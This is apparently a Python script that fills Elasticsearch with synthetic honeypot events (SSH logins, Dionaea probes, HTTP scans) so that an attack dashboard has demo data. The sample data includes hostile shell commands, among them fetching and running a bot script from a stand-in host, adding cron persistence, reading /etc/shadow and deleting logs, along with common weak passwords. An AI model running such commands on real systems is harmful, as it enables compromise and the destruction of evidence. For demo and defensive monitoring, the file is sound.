#!/usr/bin/env python3
"""
Seed Elasticsearch with realistic fake attack data for dashboard demo.

Usage:
    python3 scripts/seed_attacks.py
    python3 scripts/seed_attacks.py --es http://localhost:9200
    python3 scripts/seed_attacks.py --count 1000

The script creates the honeypot-* indices with correct geo_point mappings,
then bulk-inserts synthetic attack events spanning the last 24 hours.
Run this once after `make deploy` to populate the dashboard.
"""

import argparse
import json
import random
import sys
from datetime import datetime, timedelta, timezone

try:
    import requests
except ImportError:
    print("requests not installed — run: pip install requests")
    sys.exit(1)


# ---------------------------------------------------------------------------
# Realistic attacker profiles: (ip, country, city, lat, lon)
# ---------------------------------------------------------------------------
ATTACKERS = [
    # Russia
    ("185.220.101.45",  "Russia",          "Moscow",         55.7558,  37.6173),
    ("45.142.212.100",  "Russia",          "Saint Petersburg",59.9311, 30.3609),
    ("91.108.4.77",     "Russia",          "Novosibirsk",    54.9833,  82.8964),
    ("193.32.162.10",   "Russia",          "Yekaterinburg",  56.8519,  60.6122),
    # China
    ("122.194.155.20",  "China",           "Beijing",        39.9042, 116.4074),
    ("218.92.0.180",    "China",           "Shanghai",       31.2304, 121.4737),
    ("61.177.172.11",   "China",           "Guangzhou",      23.1291, 113.2644),
    ("101.71.40.200",   "China",           "Chengdu",        30.5728, 104.0668),
    # United States
    ("104.16.100.52",   "United States",   "San Francisco",  37.7749,-122.4194),
    ("198.199.90.7",    "United States",   "New York",       40.7128, -74.0060),
    ("35.196.20.40",    "United States",   "Iowa",           41.8780, -93.0977),
    # Netherlands
    ("89.248.167.131",  "Netherlands",     "Amsterdam",      52.3676,   4.9041),
    ("185.220.100.254", "Netherlands",     "Amsterdam",      52.3676,   4.9041),
    # Germany
    ("178.62.208.98",   "Germany",         "Frankfurt",      50.1109,   8.6821),
    ("80.66.88.207",    "Germany",         "Berlin",         52.5200,  13.4050),
    # Vietnam
    ("113.161.53.99",   "Vietnam",         "Ho Chi Minh",    10.8231, 106.6297),
    ("171.245.200.15",  "Vietnam",         "Hanoi",          21.0285, 105.8542),
    # Brazil
    ("177.54.144.67",   "Brazil",          "São Paulo",     -23.5505, -46.6333),
    ("187.65.220.101",  "Brazil",          "Rio de Janeiro",-22.9068, -43.1729),
    # India
    ("103.21.127.88",   "India",           "Mumbai",         19.0760,  72.8777),
    ("45.34.144.20",    "India",           "Bangalore",      12.9716,  77.5946),
    # Romania
    ("91.121.208.35",   "Romania",         "Bucharest",      44.4268,  26.1025),
    # Iran
    ("185.220.103.5",   "Iran",            "Tehran",         35.6892,  51.3890),
    # Ukraine
    ("176.111.174.28",  "Ukraine",         "Kyiv",           50.4501,  30.5234),
    # Turkey
    ("62.182.80.13",    "Turkey",          "Istanbul",       41.0082,  28.9784),
    # South Korea
    ("175.196.40.3",    "South Korea",     "Seoul",          37.5665, 126.9780),
    # Japan
    ("153.120.100.33",  "Japan",           "Tokyo",          35.6762, 139.6503),
    # Indonesia
    ("36.95.47.100",    "Indonesia",       "Jakarta",        -6.2088, 106.8456),
    # Canada
    ("70.35.195.117",   "Canada",          "Toronto",        43.6532, -79.3832),
    # France
    ("51.77.50.55",     "France",          "Paris",          48.8566,   2.3522),
    # Poland
    ("109.205.60.78",   "Poland",          "Warsaw",         52.2297,  21.0122),
]

# ---------------------------------------------------------------------------
# Realistic credentials attempted against SSH
# ---------------------------------------------------------------------------
USERNAMES = [
    "root", "admin", "ubuntu", "pi", "oracle", "postgres", "mysql",
    "test", "user", "guest", "operator", "support", "deploy", "git",
    "jenkins", "hadoop", "ftpuser", "www", "nagios", "zabbix",
]

PASSWORDS = [
    "123456", "password", "admin", "root", "1234", "12345678",
    "qwerty", "abc123", "admin123", "pass123", "letmein", "welcome",
    "monkey", "dragon", "master", "changeme", "toor", "raspberry",
    "!@#$%^", "P@ssw0rd", "1qaz2wsx", "test123", "alpine",
]

# ---------------------------------------------------------------------------
# Realistic shell commands executed after successful logins
# ---------------------------------------------------------------------------
COMMANDS = [
    "uname -a",
    "cat /etc/passwd",
    "cat /etc/shadow",
    "id",
    "whoami",
    "ls -la /root",
    "ps aux",
    "netstat -antup",
    "ifconfig",
    "ip addr",
    "df -h",
    "free -m",
    "wget http://malicious.example.com/bot.sh -O /tmp/bot.sh",
    "curl -s http://malicious.example.com/update | bash",
    "chmod +x /tmp/bot.sh && /tmp/bot.sh",
    "./bot.sh",
    "crontab -l",
    "echo '* * * * * /tmp/bot.sh' | crontab -",
    "cat /proc/cpuinfo",
    "ssh-keygen -t rsa -N '' -f ~/.ssh/id_rsa",
    "masscan -p 22 0.0.0.0/0 --rate 1000",
    "find / -perm -4000 2>/dev/null",
    "history -c",
    "rm -rf /var/log/*",
]

COWRIE_EVENT_TYPES = ["login_failed", "login_failed", "login_failed",
                     "login_success", "command_exec", "file_download"]

HTTP_PATHS = [
    "/admin", "/wp-admin/", "/.env", "/phpmyadmin/", "/config.php",
    "/api/v1/users", "/.git/config", "/backup.zip", "/shell.php",
    "/wp-login.php", "/xmlrpc.php", "/manager/html", "/console/login",
    "/actuator/env", "/solr/admin/", "/.aws/credentials",
    "/etc/passwd", "/cgi-bin/test.cgi", "/login", "/admin/login",
]

HTTP_METHODS = ["GET", "GET", "GET", "POST", "POST"]

DIONAEA_EVENTS = [
    "SMB connection attempt",
    "FTP login attempt",
    "MySQL connection attempt",
    "MSSQL connection attempt",
    "SIP REGISTER flood",
    "SIP INVITE attempt",
    "HTTP exploit probe",
    "RPC bind attempt",
]


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def random_timestamp(hours_back: int = 24) -> str:
    """Return a random ISO-8601 UTC timestamp within the last N hours."""
    offset = random.random() * hours_back * 3600
    ts = datetime.now(timezone.utc) - timedelta(seconds=offset)
    return ts.strftime("%Y-%m-%dT%H:%M:%S.000Z")


def today_index_suffix() -> str:
    return datetime.now(timezone.utc).strftime("%Y.%m.%d")


def create_index_mapping(es_url: str, index: str):
    """PUT an explicit mapping so geoip.location is treated as geo_point."""
    mapping = {
        "mappings": {
            "properties": {
                "@timestamp": {"type": "date"},
                "src_ip":     {"type": "ip"},
                "geoip": {
                    "properties": {
                        "location":     {"type": "geo_point"},
                        "latitude":     {"type": "float"},
                        "longitude":    {"type": "float"},
                        "country_name": {"type": "keyword"},
                        "city_name":    {"type": "keyword"},
                    }
                },
                "honeypot_type": {"type": "keyword"},
                "event_type":    {"type": "keyword"},
                "username":      {"type": "keyword"},
                "password":      {"type": "keyword"},
                "input":         {"type": "text", "fields": {"keyword": {"type": "keyword", "ignore_above": 256}}},
            }
        }
    }
    url = f"{es_url}/{index}"
    resp = requests.put(url, json=mapping, timeout=10)
    if resp.status_code in (200, 400):  # 400 = already exists
        return
    print(f"  Warning: mapping PUT {index} → HTTP {resp.status_code}: {resp.text[:120]}")


def build_cowrie_doc() -> dict:
    ip, country, city, lat, lon = random.choice(ATTACKERS)
    event_type = random.choice(COWRIE_EVENT_TYPES)
    doc = {
        "@timestamp":   random_timestamp(),
        "src_ip":       ip,
        "honeypot_type": "cowrie-ssh",
        "event_type":   event_type,
        "type":         "cowrie",
        "geoip": {
            "location":     {"lat": lat, "lon": lon},
            "latitude":     lat,
            "longitude":    lon,
            "country_name": country,
            "city_name":    city,
        },
    }
    if event_type in ("login_failed", "login_success"):
        doc["username"] = random.choice(USERNAMES)
        doc["password"] = random.choice(PASSWORDS)
    if event_type == "command_exec":
        doc["username"] = "root"
        doc["input"]    = random.choice(COMMANDS)
    return doc


def build_dionaea_doc() -> dict:
    ip, country, city, lat, lon = random.choice(ATTACKERS)
    return {
        "@timestamp":   random_timestamp(),
        "src_ip":       ip,
        "honeypot_type": "dionaea",
        "event_type":   "dionaea_event",
        "type":         "dionaea",
        "message":      random.choice(DIONAEA_EVENTS),
        "geoip": {
            "location":     {"lat": lat, "lon": lon},
            "latitude":     lat,
            "longitude":    lon,
            "country_name": country,
            "city_name":    city,
        },
    }


def build_flask_doc() -> dict:
    ip, country, city, lat, lon = random.choice(ATTACKERS)
    return {
        "@timestamp":   random_timestamp(),
        "src_ip":       ip,
        "honeypot_type": "flask-http",
        "event_type":   "http_request",
        "type":         "flask",
        "http_method":  random.choice(HTTP_METHODS),
        "request_url":  f"http://target{random.choice(HTTP_PATHS)}",
        "geoip": {
            "location":     {"lat": lat, "lon": lon},
            "latitude":     lat,
            "longitude":    lon,
            "country_name": country,
            "city_name":    city,
        },
    }


def bulk_insert(es_url: str, index: str, docs: list) -> int:
    """POST docs using the Elasticsearch bulk API. Returns number of indexed docs."""
    lines = []
    for doc in docs:
        lines.append(json.dumps({"index": {"_index": index}}))
        lines.append(json.dumps(doc))
    body = "\n".join(lines) + "\n"

    resp = requests.post(
        f"{es_url}/_bulk",
        headers={"Content-Type": "application/x-ndjson"},
        data=body,
        timeout=30,
    )
    if resp.status_code not in (200, 201):
        print(f"  Bulk error HTTP {resp.status_code}: {resp.text[:200]}")
        return 0

    result   = resp.json()
    errors   = result.get("errors", False)
    indexed  = sum(1 for i in result.get("items", []) if i.get("index", {}).get("result") in ("created", "updated"))
    if errors:
        failed = [i["index"]["error"] for i in result.get("items", []) if "error" in i.get("index", {})]
        print(f"  {len(failed)} documents failed. First error: {failed[0]}")
    return indexed


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(description="Seed Elasticsearch with demo attack data")
    parser.add_argument("--es",    default="http://localhost:9200", help="Elasticsearch URL")
    parser.add_argument("--count", type=int, default=600, help="Total documents to insert (default 600)")
    args = parser.parse_args()

    es_url = args.es.rstrip("/")
    total  = args.count

    # Verify Elasticsearch is reachable
    try:
        resp = requests.get(f"{es_url}/_cluster/health", timeout=5)
        status = resp.json().get("status", "unknown")
        print(f"Elasticsearch: {status} ({es_url})")
        if status not in ("green", "yellow"):
            print("Elasticsearch is not ready. Start the stack first: make deploy")
            sys.exit(1)
    except Exception as e:
        print(f"Cannot reach Elasticsearch at {es_url}: {e}")
        print("Start the stack first: make deploy")
        sys.exit(1)

    suffix = today_index_suffix()
    indices = {
        "cowrie":   f"honeypot-cowrie-{suffix}",
        "dionaea":  f"honeypot-dionaea-{suffix}",
        "flask":    f"honeypot-flask-{suffix}",
    }

    # Create mappings
    print("\nCreating index mappings...")
    for label, index in indices.items():
        create_index_mapping(es_url, index)
        print(f"  {index}")

    # Distribute documents: 60% cowrie, 20% dionaea, 20% flask
    cowrie_n  = int(total * 0.60)
    dionaea_n = int(total * 0.20)
    flask_n   = total - cowrie_n - dionaea_n

    batches = [
        ("cowrie",   indices["cowrie"],   [build_cowrie_doc()  for _ in range(cowrie_n)]),
        ("dionaea",  indices["dionaea"],  [build_dionaea_doc() for _ in range(dionaea_n)]),
        ("flask",    indices["flask"],    [build_flask_doc()   for _ in range(flask_n)]),
    ]

    print(f"\nInserting {total} documents...")
    grand_total = 0
    for label, index, docs in batches:
        n = bulk_insert(es_url, index, docs)
        grand_total += n
        print(f"  {label:<10} → {index} : {n} documents indexed")

    print(f"\nDone. {grand_total} / {total} documents inserted.")
    print("\nRefresh the dashboard: http://localhost:5000")
    print("  Map          → shows attack origins worldwide")
    print("  Attack table → top credentials, commands, countries")
    print("  Timeline     → hourly attack counts over last 24h")


if __name__ == "__main__":
    main()
